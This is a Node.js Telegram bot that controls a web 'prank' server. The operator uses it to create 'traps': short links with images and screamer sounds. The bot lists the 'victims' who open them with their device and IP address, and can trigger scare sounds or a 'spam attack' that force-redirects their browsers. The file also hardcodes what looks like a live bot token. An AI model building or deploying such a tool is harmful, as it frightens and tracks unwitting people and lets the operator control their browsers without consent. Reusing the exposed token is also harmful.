/**
 * 🛡️ NFC CONTROL SYSTEM v2.2 [VIDEO SOUND + STICKER SUPPORT]
 * Модуль управления сервером через Telegram
 * Язык интерфейса: Русский (Стандартный)
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- ПІДКЛЮЧЕННЯ FFMPEG для обробки відео ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАСТРОЙКИ ---
const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Твой токен NFC бота

// Перевірка наявності глобальних змінних
if (!global.sessions || !global.activeVictims || !global.shortLinks) {
    console.error('❌ ERROR: Global variables not initialized! Make sure server.js initializes them first.');
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
const wizardState = {}; // Состояние создания ловушки

console.log('🤖 NFC Control Bot starting with VIDEO & STICKER support...');

// --- ГЕНЕРАТОР КОДА ---
function generateShortCode() {
    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    
    if (global.shortLinks && global.shortLinks[result]) {
        return generateShortCode();
    }
    return result;
}

// --- ЗАГРУЗКА ФАЙЛОВ ---
async function downloadFile(fileId, type) {
    try {
        const link = await bot.getFileLink(fileId);
        const ext = path.extname(link);
        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, name);
        
        const writer = fs.createWriteStream(filePath);
        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
        res.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Ошибка загрузки:', e);
        return { url: null, path: null };
    }
}

// --- ИЗВЛЕЧЕНИЕ ЗВУКА ИЗ ВИДЕО ---
async function extractAudioFromVideo(videoPath) {
    return new Promise((resolve, reject) => {
        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
        
        ffmpeg(videoPath)
            .toFormat('mp3')
            .audioCodec('libmp3lame')
            .audioBitrate('192k')
            .on('end', () => {
                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                resolve({ url: audioUrl, path: audioPath });
            })
            .on('error', (err) => {
                console.error('FFmpeg error:', err);
                reject(err);
            })
            .save(audioPath);
    });
}

// --- КОНВЕРТАЦИЯ СТИКЕРА В JPG ---
async function convertStickerToImage(stickerPath) {
    return new Promise((resolve, reject) => {
        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
        
        ffmpeg(stickerPath)
            .outputOptions([
                '-vf', 'scale=800:800:force_original_aspect_ratio=decrease,pad=800:800:(ow-iw)/2:(oh-ih)/2:black'
            ])
            .toFormat('mjpeg')
            .on('end', () => {
                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                // Удаляем оригинальный .webp файл
                fs.unlink(stickerPath, () => {});
                resolve({ url: imageUrl, path: imagePath });
            })
            .on('error', (err) => {
                console.error('Sticker conversion error:', err);
                reject(err);
            })
            .save(imagePath);
    });
}

// --- ГЛАВНОЕ МЕНЮ ---
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "🤖 **PANEL CONTROL V2.2**\n\n✨ **Новое:**\n• 🎬 Звук автоматически берется из видео\n• 🎭 Стикеры можно использовать как фон\n\nСистема готова к работе. Выберите действие:", {
        parse_mode: 'Markdown',
        reply_markup: {
            keyboard: [
                ['➕ Создать новую ловушку'], 
                ['📂 Активные сессии'],
                ['ℹ️ Статус сервера']
            ],
            resize_keyboard: true
        }
    });
});

// --- ОБРАБОТКА СООБЩЕНИЙ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Пропускаем команды
    if (text && text.startsWith('/')) return;

    // 1. Создание
    if (text === '➕ Создать новую ловушку') {
        wizardState[chatId] = { step: 1, data: {} };
        return bot.sendMessage(chatId, "📝 **ШАГ 1/2**\n\nОтправьте:\n• 🖼 **Изображение** (фон)\n• 🎭 **Стикер** (будет конвертирован в фон)\n• 🎬 **Видео** (звук будет извлечен автоматически)\n\n_Напишите 'skip' для стандартного фона._", { parse_mode: 'Markdown' });
    }

    // 2. Список сессий
    if (text === '📂 Активные сессии') {
        if (!global.sessions) {
            return bot.sendMessage(chatId, "⚠️ Сервер не инициализирован.");
        }
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) {
            return bot.sendMessage(chatId, "📂 Активных сессий не найдено.");
        }

        const recentSessions = sessions.slice(-5);
        for (const s of recentSessions) {
            sendControlPanel(chatId, s.id);
        }
        return;
    }

    // 3. Статус
    if (text === 'ℹ️ Статус сервера') {
        const vCount = Object.keys(global.activeVictims || {}).length;
        const sCount = Object.keys(global.sessions || {}).length;
        return bot.sendMessage(chatId, `📊 **SERVER STATUS**\n\n🟢 Онлайн жертв: ${vCount}\n📁 Всего сессий: ${sCount}\n⚡ Статус: Active`, { parse_mode: 'Markdown' });
    }

    // --- WIZARD (ПОШАГОВОЕ СОЗДАНИЕ) ---
    if (wizardState[chatId]) {
        const st = wizardState[chatId];

        // ====================================
        // ШАГ 1: ИЗОБРАЖЕНИЕ / СТИКЕР / ВИДЕО
        // ====================================
        if (st.step === 1) {
            let processMsg = null;
            
            // ФОТО
            if (msg.photo) {
                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка изображения...");
                const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                st.data.image = f.url || '';
                st.data.sound = ''; // Нет звука из фото
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            } 
            // СТИКЕР → КОНВЕРТИРУЕМ В JPG
            else if (msg.sticker) {
                processMsg = await bot.sendMessage(chatId, "⏳ Конвертация стикера в фон...");
                const f = await downloadFile(msg.sticker.file_id, 'sticker');
                
                if (f.path) {
                    try {
                        const converted = await convertStickerToImage(f.path);
                        st.data.image = converted.url || '';
                        await bot.editMessageText("✅ Стикер конвертирован в фон!", {
                            chat_id: chatId,
                            message_id: processMsg.message_id
                        });
                    } catch (e) {
                        await bot.editMessageText("❌ Ошибка конвертации стикера", {
                            chat_id: chatId,
                            message_id: processMsg.message_id
                        });
                        st.data.image = '';
                    }
                } else {
                    st.data.image = '';
                }
                st.data.sound = ''; // Нет звука из стикера
            }
            // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
            else if (msg.video || msg.video_note) {
                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка видео и извлечение звука...");
                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                const f = await downloadFile(fileId, 'video');
                
                if (f.path) {
                    try {
                        // Извлекаем звук
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                        
                        await bot.editMessageText("✅ Видео загружено, звук извлечен!\n\n_Переходим к шагу 2..._", {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'Markdown'
                        });
                    } catch (e) {
                        await bot.editMessageText("⚠️ Видео загружено, но не удалось извлечь звук", {
                            chat_id: chatId,
                            message_id: processMsg.message_id
                        });
                        st.data.sound = '';
                    }
                } else {
                    st.data.sound = '';
                }
                st.data.image = ''; // Нет изображения из видео
            }
            // SKIP
            else if (text && text.toLowerCase() === 'skip') {
                st.data.image = '';
                st.data.sound = '';
            }
            // НЕВЕРНЫЙ ТИП
            else {
                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте изображение, стикер или видео (или напишите 'skip')");
            }
            
            st.step = 2;
            
            // Если из видео уже есть звук, сразу создаем ловушку
            if (st.data.sound) {
                bot.sendMessage(chatId, "📝 **Звук уже получен из видео!**\n\n_Хотите добавить дополнительный аудиофайл? Отправьте его сейчас или напишите 'skip' для завершения._", { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, "📝 **ШАГ 2/2**\n\nОтправьте:\n• 🎵 **Аудиофайл** (скример/звук)\n• 🎤 **Голосовое сообщение**\n• 🎬 **Видео** (звук будет извлечен)\n\n_Напишите 'skip' для создания без звука._", { parse_mode: 'Markdown' });
            }
            return;
        }

        // ====================================
        // ШАГ 2: ЗВУК / ВИДЕО
        // ====================================
        if (st.step === 2) {
            let processMsg = null;
            
            // АУДИО
            if (msg.audio) {
                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка аудио...");
                const f = await downloadFile(msg.audio.file_id, 'snd');
                st.data.sound = f.url || '';
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            }
            // ГОЛОСОВОЕ
            else if (msg.voice) {
                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка голосового...");
                const f = await downloadFile(msg.voice.file_id, 'voice');
                st.data.sound = f.url || '';
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            }
            // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
            else if (msg.video || msg.video_note) {
                processMsg = await bot.sendMessage(chatId, "⏳ Извлечение звука из видео...");
                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                const f = await downloadFile(fileId, 'video');
                
                if (f.path) {
                    try {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                        await bot.editMessageText("✅ Звук извлечен из видео!", {
                            chat_id: chatId,
                            message_id: processMsg.message_id
                        });
                    } catch (e) {
                        await bot.editMessageText("❌ Не удалось извлечь звук", {
                            chat_id: chatId,
                            message_id: processMsg.message_id
                        });
                        st.data.sound = st.data.sound || ''; // Оставляем старый звук если был
                    }
                }
            }
            // SKIP
            else if (text && text.toLowerCase() === 'skip') {
                // Звук уже может быть из видео с шага 1
                st.data.sound = st.data.sound || '';
            }
            // НЕВЕРНЫЙ ТИП
            else {
                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте аудиофайл, голосовое сообщение или видео (или напишите 'skip')");
            }

            // Финиш
            finishSessionCreation(chatId, st.data);
            delete wizardState[chatId];
        }
    }
});

// --- ФУНКЦИЯ СОЗДАНИЯ ---
function finishSessionCreation(chatId, data) {
    const id = uuidv4();
    const code = generateShortCode();

    const session = {
        id: id,
        shortCode: code,
        image: data.image || '',
        sound: data.sound || '',
        autoMode: true, // Автоматически включено
        totalVictims: 0,
        createdAt: new Date(),
        lastActiveAt: Date.now(),
        creator: {
            ip: 'Telegram Bot',
            device: '🤖 Bot'
        },
        imagesFiles: [],
        soundsFiles: []
    };

    // Запись в глобальную память сервера
    global.sessions[id] = session;
    global.shortLinks[code] = id;

    bot.sendMessage(chatId, "✅ **Ловушка успешно создана!**", { parse_mode: 'Markdown' });
    sendControlPanel(chatId, id);
}

// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
function sendControlPanel(chatId, sessionId) {
    const s = global.sessions[sessionId];
    if (!s) {
        bot.sendMessage(chatId, "⚠️ Ошибка: сессия не найдена.");
        return;
    }

    // Считаем жертв
    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
    
    // Ссылка (замени на свой домен)
    const link = `https://prank-nfc.onrender.com/${s.shortCode}`; 

    let msg = `🆔 **ID Сессии:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
    
    // Показываем что загружено
    if (s.image) msg += "\n🖼 Фон: ✅";
    if (s.sound) msg += "\n🔊 Звук: ✅";

    if (victims.length > 0) {
        msg += "\n\n📱 **Устройства:**\n" + victims.map(v => `• ${v.device} [${v.ip}]`).join('\n');
    }

    bot.sendMessage(chatId, msg, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔊 Скример", callback_data: `scare_${sessionId}` }, 
                    { text: "☢️ Спам-атака", callback_data: `bomb_${sessionId}` }
                ],
                [
                    { text: `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: `auto_${sessionId}` }
                ],
                [
                    { text: "🔄 Обновить", callback_data: `refresh_${sessionId}` }, 
                    { text: "❌ Удалить", callback_data: `del_${sessionId}` }
                ]
            ]
        }
    }).catch(err => {
        console.error('Error sending control panel:', err.message);
    });
}

// --- ОБРАБОТКА КНОПОК ---
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (!data || !data.includes('_')) {
        return bot.answerCallbackQuery(query.id, { text: "⚠️ Неверный формат данных." });
    }
    
    const [action, sessionId] = data.split('_');
    const s = global.sessions ? global.sessions[sessionId] : null;

    if (!s && action !== 'del') {
        return bot.answerCallbackQuery(query.id, { text: "⚠️ Ошибка: Сессия не найдена." });
    }

    if (!global.io) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Ошибка сервера: Socket.IO недоступен." });
    }

    switch (action) {
        case 'scare':
            global.io.to(sessionId).emit('play-sound');
            bot.answerCallbackQuery(query.id, { text: "🔊 Звук отправлен!" });
            break;

        case 'bomb':
            global.io.to(sessionId).emit('force-redirect', { url: "https://google.com" }); 
            bot.answerCallbackQuery(query.id, { text: "☢️ Команда атаки отправлена!" });
            break;

        case 'auto':
            s.autoMode = !s.autoMode;
            global.io.to(sessionId).emit('update-media', { 
                sound: s.sound, 
                image: s.image, 
                auto: s.autoMode 
            });
            
            try {
                const kb = query.message.reply_markup.inline_keyboard;
                kb[1][0].text = `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`;
                bot.editMessageReplyMarkup(
                    { inline_keyboard: kb }, 
                    { chat_id: chatId, message_id: query.message.message_id }
                );
            } catch (e) {
                console.error('Error updating button:', e.message);
            }
            
            bot.answerCallbackQuery(query.id, { text: `Авто-режим: ${s.autoMode ? 'Включен ✅' : 'Выключен ❌'}` });
            break;

        case 'refresh':
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            sendControlPanel(chatId, sessionId);
            bot.answerCallbackQuery(query.id, { text: "🔄 Обновлено" });
            break;

        case 'del':
            if (global.sessions[sessionId]) {
                delete global.sessions[sessionId];
            }
            if (s && global.shortLinks[s.shortCode]) {
                delete global.shortLinks[s.shortCode];
            }
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            bot.answerCallbackQuery(query.id, { text: "🗑 Сессия удалена." });
            break;

        default:
            bot.answerCallbackQuery(query.id, { text: "⚠️ Неизвестное действие" });
    }
});

// Обработка ошибок polling
bot.on('polling_error', (error) => {
    console.error('❌ Polling error:', error.code, error.message);
});

// Обработка общих ошибок
bot.on('error', (error) => {
    console.error('❌ Bot error:', error.message);
});

console.log('✅ NFC Control Bot loaded: VIDEO SOUND + STICKER support enabled');

module.exports = bot;
